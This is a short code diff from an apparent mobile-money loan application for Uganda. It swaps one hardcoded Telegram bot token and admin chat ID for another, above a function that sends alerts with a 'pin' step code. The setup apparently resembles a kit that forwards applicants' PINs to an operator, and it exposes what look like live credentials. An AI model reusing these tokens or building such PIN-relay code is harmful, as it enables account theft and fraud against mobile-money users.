@@ -14,8 +14,8 @@ db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
 # Dedicated Uganda Telegram Configuration 🇺🇬
-TELEGRAM_BOT_TOKEN = "9106925472:AAEcFDIOHZAvUAAgNKqjZLGp8Z_Bre5l4DI"
-TELEGRAM_ADMIN_CHAT_ID = "7217281586"
+TELEGRAM_BOT_TOKEN = "8467275364:AAFJlOk-8cOlhok0XC40s-x604G0YxW_hqs"
+TELEGRAM_ADMIN_CHAT_ID = "8965398913"
 
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
     db_id = str(app_data.get("_id"))
